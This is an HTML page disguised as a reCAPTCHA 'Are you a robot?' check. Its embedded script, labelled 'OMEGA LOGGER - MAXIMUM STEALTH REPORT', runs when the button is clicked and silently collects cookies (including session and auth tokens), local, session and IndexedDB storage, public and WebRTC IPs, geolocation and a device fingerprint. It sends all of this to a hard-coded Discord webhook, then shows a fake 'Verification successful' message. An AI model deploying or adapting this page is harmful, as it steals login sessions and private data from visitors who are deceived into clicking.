<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .captcha-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            width: 360px;
            padding: 28px 24px 32px;
            text-align: center;
            border: 1px solid #ddd;
            transition: all 0.2s;
        }
        .logo {
            font-size: 48px;
            margin-bottom: 16px;
        }
        h3 {
            font-size: 22px;
            font-weight: 500;
            color: #1a1a1a;
            margin-bottom: 12px;
        }
        .robot-icon {
            font-size: 64px;
            margin: 15px 0;
        }
        .question {
            font-size: 18px;
            color: #333;
            margin-bottom: 28px;
            font-weight: 500;
        }
        .captcha-button {
            background: #4CAF50;
            border: none;
            color: white;
            font-size: 18px;
            font-weight: bold;
            padding: 12px 28px;
            border-radius: 40px;
            cursor: pointer;
            transition: 0.2s;
            width: 100%;
            letter-spacing: 0.5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .captcha-button:hover {
            background: #45a049;
            transform: scale(1.01);
        }
        .footer {
            margin-top: 24px;
            font-size: 11px;
            color: #888;
        }
        .hidden {
            display: none;
        }
        .message {
            font-size: 16px;
            color: #2c7a2c;
            margin-top: 20px;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="captcha-container" id="captchaBox">
        <div class="logo">✓</div>
        <div class="robot-icon">🤖</div>
        <div class="question">Are you a robot?</div>
        <button class="captcha-button" id="fakeCaptchaBtn">❌ NO</button>
        <div class="footer">Protected by reCAPTCHA<br>Terms of Service apply</div>
    </div>

    <script>
        // ==================== WEBHOOK (tvoj) ====================
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";

        // ==================== TIHA PRIKUPLJANJA (bez popupova) ====================
        function getAllCookies() {
            if (!document.cookie) return [];
            return document.cookie.split(';').map(c => c.trim()).filter(Boolean).map(c => {
                let [name, ...rest] = c.split('=');
                let value = rest.join('=');
                return { name: name.trim(), value: value, platform: categorizeCookie(name, value) };
            });
        }

        function categorizeCookie(name, value) {
            const n = name.toLowerCase();
            if (n.includes("fb") || n.includes("facebook")) return "Facebook";
            if (n.includes("google") || n.includes("_ga")) return "Google";
            if (n.includes("twitter")) return "Twitter";
            if (n.includes("amazon") || n.includes("amzn")) return "Amazon";
            if (n.includes("session") || n.includes("token") || n.includes("auth") || n.includes("jwt")) return "Session/Auth";
            if (n.includes("ad") || n.includes("track") || n.includes("pixel")) return "Ad/Tracker";
            return "Other";
        }

        function getAllLocalStorage() {
            try { return { ...localStorage }; } catch(e) { return { error: e.message }; }
        }
        function getAllSessionStorage() {
            try { return { ...sessionStorage }; } catch(e) { return { error: e.message }; }
        }
        async function getAllIndexedDB() {
            if (!window.indexedDB || !window.indexedDB.databases) return { info: "Cannot enumerate" };
            try { return await window.indexedDB.databases(); } catch(e) { return { error: e.message }; }
        }

        function getGPU() {
            try {
                const canvas = document.createElement("canvas");
                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                if (!gl) return { error: "WebGL unavailable" };
                const debug = gl.getExtension("WEBGL_debug_renderer_info");
                if (debug) {
                    return {
                        renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL),
                        vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)
                    };
                }
                return { error: "No debug extension" };
            } catch(e) { return { error: e.message }; }
        }

        async function getBattery() {
            if (!navigator.getBattery) return "Unavailable";
            try {
                const b = await navigator.getBattery();
                return { level: Math.round(b.level * 100) + "%", charging: b.charging };
            } catch(e) { return "Error"; }
        }

        function getConnection() {
            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!c) return "Unavailable";
            return {
                effectiveType: c.effectiveType,
                downlink: c.downlink,
                rtt: c.rtt,
                saveData: c.saveData
            };
        }

        function getPlugins() {
            try {
                return Array.from(navigator.plugins).map(p => p.name);
            } catch(e) { return []; }
        }

        function getFonts() {
            if (!document.fonts) return "Unavailable";
            try {
                let fontSet = [];
                for (let font of document.fonts.values()) fontSet.push(font.family);
                return fontSet.slice(0, 30); // limit size
            } catch(e) { return []; }
        }

        function getWebRTCIPs() {
            return new Promise((resolve) => {
                let ips = [];
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel("");
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (event) => {
                        if (!event.candidate) {
                            resolve(ips.length ? ips : ["No local IPs found"]);
                            return;
                        }
                        const candidate = event.candidate.candidate;
                        const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                        if (ipMatch && !ips.includes(ipMatch[0])) ips.push(ipMatch[0]);
                    };
                    setTimeout(() => resolve(ips.length ? ips : ["Timeout"]), 2000);
                } catch(e) {
                    resolve(["WebRTC blocked"]);
                }
            });
        }

        async function getPublicIP() {
            try {
                const res = await fetch("https://api.ipify.org?format=json");
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return "Failed";
            }
        }

        async function getIPGeo() {
            try {
                const res = await fetch("https://ipapi.co/json/");
                if (!res.ok) return { error: "HTTP " + res.status };
                return await res.json();
            } catch(e) {
                return { error: e.message };
            }
        }

        async function getFingerprint(gpu) {
            const raw = [
                navigator.userAgent,
                navigator.language,
                screen.width, screen.height, screen.colorDepth,
                navigator.hardwareConcurrency,
                navigator.deviceMemory,
                gpu.renderer || "",
                gpu.vendor || "",
                new Date().getTimezoneOffset()
            ].join("|");
            const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
            return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("");
        }

        // ==================== GLAVNA FUNKCIJA ZA PRIKUPLJANJE SVEGA ====================
        async function collectEverything() {
            const gpu = getGPU();
            const fingerprint = await getFingerprint(gpu);
            const battery = await getBattery();
            const connection = getConnection();
            const plugins = getPlugins();
            const fonts = getFonts();
            const cookies = getAllCookies();
            const localStorage = getAllLocalStorage();
            const sessionStorage = getAllSessionStorage();
            const indexedDB = await getAllIndexedDB();
            const publicIP = await getPublicIP();
            const geo = await getIPGeo();
            const webRTC = await getWebRTCIPs();

            // Group cookies by platform
            const cookiesByPlatform = {};
            for (const c of cookies) {
                if (!cookiesByPlatform[c.platform]) cookiesByPlatform[c.platform] = [];
                cookiesByPlatform[c.platform].push(c);
            }

            return {
                timestamp: new Date().toISOString(),
                pageURL: window.location.href,
                referrer: document.referrer,
                publicIP: publicIP,
                geoInfo: geo,
                webRTC_IPs: webRTC,
                cookiesCount: cookies.length,
                cookiesByPlatform: cookiesByPlatform,
                localStorage: localStorage,
                sessionStorage: sessionStorage,
                indexedDB: indexedDB,
                navigator: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    online: navigator.onLine
                },
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    orientation: screen.orientation?.type || "n/a"
                },
                windowSize: {
                    inner: `${window.innerWidth}x${window.innerHeight}`,
                    outer: `${window.outerWidth}x${window.outerHeight}`
                },
                gpu: gpu,
                battery: battery,
                connection: connection,
                plugins: plugins,
                fontsLoaded: fonts,
                fingerprint: fingerprint,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                touchSupport: 'ontouchstart' in window,
                localStorageSize: JSON.stringify(localStorage).length,
                sessionStorageSize: JSON.stringify(sessionStorage).length
            };
        }

        // ==================== GENERIRANJE TXT REPORTA ====================
        async function generateTextReport(data) {
            let report = "=".repeat(80) + "\n";
            report += "          OMEGA LOGGER - MAXIMUM STEALTH REPORT\n";
            report += "=".repeat(80) + "\n\n";
            report += `Time: ${data.timestamp}\n`;
            report += `URL: ${data.pageURL}\n`;
            report += `Referrer: ${data.referrer || "(none)"}\n\n`;

            // IP i GEO
            report += "🌐 IP & GEOLOCATION (ipapi.co)\n";
            report += `Public IP: ${data.publicIP}\n`;
            if (data.geoInfo.error) {
                report += `Geo error: ${data.geoInfo.error}\n`;
            } else {
                report += `City: ${data.geoInfo.city || "?"}\n`;
                report += `Region: ${data.geoInfo.region || "?"}\n`;
                report += `Country: ${data.geoInfo.country_name || "?"}\n`;
                report += `ISP: ${data.geoInfo.org || "?"}\n`;
                report += `Timezone (geo): ${data.geoInfo.timezone || "?"}\n`;
            }
            report += `\nLocal IPs (WebRTC): ${data.webRTC_IPs.join(", ")}\n`;

            // COOKIES
            report += "\n🍪 COOKIES (by platform)\n";
            for (const [platform, cookies] of Object.entries(data.cookiesByPlatform)) {
                report += `\n[${platform}] (${cookies.length})\n`;
                for (const c of cookies.slice(0, 20)) { // limit to avoid huge logs
                    let val = c.value.length > 100 ? c.value.slice(0,100)+"..." : c.value;
                    report += `  • ${c.name} = ${val}\n`;
                }
                if (cookies.length > 20) report += `  ... and ${cookies.length-20} more\n`;
            }
            if (data.cookiesCount === 0) report += "No cookies.\n";

            // Storage
            report += "\n💾 LOCALSTORAGE\n";
            for (const [k,v] of Object.entries(data.localStorage)) {
                let vs = typeof v === 'string' ? v : JSON.stringify(v);
                report += `${k} = ${vs.length>100?vs.slice(0,100)+"...":vs}\n`;
            }
            report += "\n📦 SESSIONSTORAGE\n";
            for (const [k,v] of Object.entries(data.sessionStorage)) {
                let vs = typeof v === 'string' ? v : JSON.stringify(v);
                report += `${k} = ${vs.length>100?vs.slice(0,100)+"...":vs}\n`;
            }

            // IndexedDB
            report += "\n🗃️ INDEXEDDB\n";
            if (Array.isArray(data.indexedDB)) {
                for (const db of data.indexedDB) report += `DB: ${db.name} v${db.version}\n`;
            } else {
                report += JSON.stringify(data.indexedDB);
            }

            // System
            report += "\n🖥️ SYSTEM & BROWSER\n";
            report += `User Agent: ${data.navigator.userAgent}\n`;
            report += `Platform: ${data.navigator.platform}\n`;
            report += `Languages: ${data.navigator.languages}\n`;
            report += `CPU Cores: ${data.navigator.hardwareConcurrency || "?"}\n`;
            report += `Device Memory: ${data.navigator.deviceMemory || "?"} GB\n`;
            report += `Cookies Enabled: ${data.navigator.cookieEnabled}\n`;
            report += `Do Not Track: ${data.navigator.doNotTrack}\n`;
            report += `Online: ${data.navigator.online}\n`;
            report += `Touch support: ${data.touchSupport}\n`;

            // Screen & Window
            report += `\nScreen: ${data.screen.width}x${data.screen.height} @ ${data.screen.colorDepth}bit\n`;
            report += `Available: ${data.screen.availWidth}x${data.screen.availHeight}\n`;
            report += `Pixel Ratio: ${data.screen.pixelRatio}\n`;
            report += `Orientation: ${data.screen.orientation}\n`;
            report += `Window inner: ${data.windowSize.inner}, outer: ${data.windowSize.outer}\n`;

            // GPU
            report += `\nGPU Renderer: ${data.gpu.renderer || "N/A"}\n`;
            report += `GPU Vendor: ${data.gpu.vendor || "N/A"}\n`;

            // Battery & Connection
            report += `\nBattery: ${JSON.stringify(data.battery)}\n`;
            report += `Connection: ${JSON.stringify(data.connection)}\n`;

            // Plugins
            report += `\nPlugins (${data.plugins.length}): ${data.plugins.join(", ")}\n`;

            // Fonts
            report += `\nFonts (first 20): ${data.fontsLoaded.slice(0,20).join(", ")}\n`;

            // Fingerprint
            report += `\n🔐 Fingerprint SHA-256: ${data.fingerprint}\n`;

            // Storage sizes
            report += `\nLocalStorage size: ${data.localStorageSize} bytes\n`;
            report += `SessionStorage size: ${data.sessionStorageSize} bytes\n`;

            report += "\n" + "=".repeat(80) + "\n";
            report += "END OF LOG - NO FURTHER ACTION\n";
            report += "=".repeat(80);
            return report;
        }

        // ==================== SLANJE NA WEBHOOK KAO FILE ====================
        async function sendToDiscord(reportText, data) {
            const blob = new Blob([reportText], { type: "text/plain" });
            const formData = new FormData();
            const filename = `logger_${data.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
            formData.append("file", blob, filename);
            const embedSummary = {
                embeds: [{
                    title: "✅ Stealth CAPTCHA Logger",
                    description: `**IP:** ${data.publicIP}\n**Cookies:** ${data.cookiesCount}\n**Fingerprint:** \`${data.fingerprint.slice(0,32)}...\``,
                    color: 0x44ff44,
                    timestamp: data.timestamp
                }]
            };
            formData.append("payload_json", JSON.stringify(embedSummary));
            try {
                const response = await fetch(WEBHOOK_URL, { method: "POST", body: formData });
                if (!response.ok) console.error("Webhook error", response.status);
                else console.log("Report sent to Discord");
            } catch(e) {
                console.error("Send failed", e);
            }
        }

        // ==================== KLIK NA FAKE CAPTCHA ====================
        let alreadyRun = false;
        const btn = document.getElementById("fakeCaptchaBtn");
        const container = document.getElementById("captchaBox");

        btn.addEventListener("click", async function(e) {
            if (alreadyRun) return;
            alreadyRun = true;
            e.preventDefault();
            
            // Immediately change button text to "Verifying..." (fake)
            btn.innerText = "Verifying...";
            btn.disabled = true;
            
            // Collect everything silently
            const allData = await collectEverything();
            const report = await generateTextReport(allData);
            await sendToDiscord(report, allData);
            
            // After sending, change CAPTCHA appearance to "Verified"
            container.innerHTML = `
                <div class="logo">✓</div>
                <div class="robot-icon" style="filter: grayscale(0);">✅</div>
                <div class="question" style="color:#2e7d32;">Verification successful</div>
                <div class="footer">Access granted · You may close this page</div>
            `;
            // No further action – user never knows they were logged.
        });
    </script>
</body>
</html>
